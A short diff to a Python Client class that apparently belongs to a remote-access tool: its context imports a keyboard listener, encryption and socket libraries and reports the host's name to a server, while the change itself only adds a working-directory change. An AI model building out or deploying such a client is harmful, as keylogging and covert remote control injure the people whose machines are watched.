@@ -4,6 +4,7 @@ import pickle
 import platform
 import socket
 import subprocess
+import sys
 import threading
 import time
 
@@ -15,6 +16,7 @@ from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import padding, rsa
+
 try:
     from pynput.keyboard import Key, Listener
     _pynput = True
@@ -168,6 +170,7 @@ class Client(object):
             self.socket.send(data)
             self.socket.recv(4096)
             self.send(socket.gethostname().encode())
+            os.chdir(os.path.dirname(sys.argv[0]))
         except Exception as e:
             logging.error(e)
 
